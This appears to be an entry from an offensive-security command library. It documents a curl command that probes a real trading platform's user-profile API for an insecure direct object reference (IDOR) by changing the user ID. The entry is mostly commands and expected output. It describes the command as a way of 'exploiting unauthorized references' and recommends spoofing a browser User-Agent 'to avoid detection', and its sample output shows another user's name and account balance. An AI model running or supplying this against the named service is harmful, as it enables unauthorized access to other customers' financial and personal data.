---
id: cmd-curl-get-user-data
data: >-
  curl -v -H "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0"
  "https://exness.com/api/user/{user_id}/profile"
tags:
  - web
  - recon
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.362Z'
verified: false
validated: true
submitted: true
---
# curl-get-user-data

## Command

```bash
curl -v -H "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0" "https://exness.com/api/user/{user_id}/profile"
```

## Description

This command uses curl to send an authenticated GET request to a user profile endpoint, testing for IDOR by varying the {user_id} parameter. It retrieves JSON data from the EXNESS API, useful for verifying legitimate access or exploiting unauthorized references.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers and response details | No |
| `-H "Cookie: session=..."` | Authentication cookie for session | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid detection | No |
| `https://exness.com/api/user/{user_id}/profile` | Endpoint URL with replaceable user_id | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" "https://exness.com/api/user/123/profile"
```

### Advanced Usage

```bash
curl -v -H "Cookie: session=abc123" -H "Accept: application/json" "https://exness.com/api/user/124/profile" > output.json
```

## Expected Output

Successful execution returns HTTP 200 with JSON like {"user_id":124,"name":"John Doe","account_balance":1000}, including verbose headers showing request/response details. Errors may show 403 Forbidden if access is denied.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-for-Horizontal-Privilege-Escalation]]
